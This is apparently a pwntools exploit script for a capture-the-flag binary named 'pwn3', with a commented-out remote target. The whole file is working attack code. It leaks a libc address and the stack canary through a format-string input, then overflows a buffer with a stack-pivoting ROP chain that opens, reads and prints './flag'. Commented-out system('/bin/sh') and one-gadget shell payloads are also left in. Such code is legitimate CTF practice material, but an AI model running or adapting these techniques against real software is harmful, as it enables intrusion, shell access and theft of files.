#coding:utf8
from pwn import *
context.log_level="debug"
p=process("./pwn3")
#p = remote("10.103.16.3",80)#2 3 5 6 10
elf=ELF("./pwn3")
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")


p.recvuntil("$ ")
p.sendline("login")
p.recvuntil("user:")
#gdb.attach(p)
p.sendline("%107$p##%11$p")
'''
65:0328│   0x7ffdee745618 —▸ 0x7ff3607fc0b3 (__libc_start_main+243) ◂— mov    edi, eax

pwndbg> p 0x328/8+6
$2 = 107

pwndbg> p 0x65+6
$2 = 107

'''
p.recvuntil("0x")
libc_base=int(p.recv(12),16)
print "libc_base : "+hex(libc_base)
libc_base=libc_base-243-libc.sym['__libc_start_main']
print "libc_base : "+hex(libc_base) 

p.recvuntil("##0x")

canary=int(p.recv(16),16)
print "canary : "+hex(canary) 

p.recvuntil("passwd:")
#gdb.attach(p)
#main_addr=
sys_addr = libc_base+libc.symbols['system']
sh_addr = libc_base+libc.search('/bin/sh').next()
pop_rdi_ret = libc_base+0x26b72
#$ ropper --file /lib/x86_64-linux-gnu/libc.so.6 --search "pop|ret" | grep rdi
print "sys_addr : "+hex(sys_addr) 
print "sh_addr : "+hex(sh_addr) 
print "pop_rdi_ret : "+hex(pop_rdi_ret) 
print "one : "+hex(libc_base+0xe6c7e) 

'''
#pd = 'a'*0x18+p64(canary)+p64(0xdeadbbef)+ p64(pop_rdi_ret) + p64(sh_addr) + p64(sys_addr)
#pd = 'a'*0x18+p64(canary)+p64(0xdeadbbef)+ p64(libc_base+0xe6c7e)#0xe6c81 0xe6c84
#pd = 'a'*0x18+p64(canary)+p64(0x7f09f76371e3)+ p64(0x7f09f76371e3)#0xe6c81 0xe6c84
#p.sendline(pd)
'''


open_addr=libc_base+libc.symbols['open']
read_addr=libc_base+libc.symbols['read']
puts_addr=libc_base+libc.symbols['puts']

__free_hook=libc_base+libc.symbols['environ']#libc.symbols['__free_hook']#0x1eb000(no ok)


pop_rdx_ret=libc_base+0x11c371      #0x000000000011c371: pop rdx; pop r12; ret;
pop_rsi_ret=libc_base+0x27529
leave_ret=libc_base+0x5aa48 

print "open_addr is "+hex(open_addr)
print "read_addr is "+hex(read_addr)
print "free_hook is "+hex(__free_hook)

print "pop_rdi_ret is "+hex(pop_rdi_ret)
print "pop_rdi_ret is "+hex(pop_rdi_ret)
print "pop_rsi_ret is "+hex(pop_rsi_ret)
print "leave_ret is "+hex(leave_ret)


pd='a'*0x18+p64(canary)+p64(__free_hook)
pd+=p64(pop_rsi_ret)+p64(__free_hook+0x8)+p64(pop_rdi_ret)+p64(0)+p64(pop_rdx_ret)+p64(0x100)+p64(0)+p64(read_addr)+p64(leave_ret)

#gdb.attach(p)
p.send(pd)


pd=p64(pop_rdi_ret)+p64(__free_hook+0xa0)+p64(pop_rsi_ret)+p64(0)+p64(pop_rdx_ret)+p64(0x0)+p64(0)+p64(open_addr) ##open("file_addr",oflag) 72 0
pd+=p64(pop_rsi_ret)+p64(__free_hook+0x100)+p64(pop_rdi_ret)+p64(3)+p64(pop_rdx_ret)+p64(0x100)+p64(0)+p64(read_addr)
#read(fd,*buf,100)
pd+=p64(pop_rdi_ret)+p64(__free_hook+0x100)+p64(puts_addr)
#puts()
pd+="./flag\x00"
p.send(pd)






print "len=>",hex(len(pd))




















p.interactive()
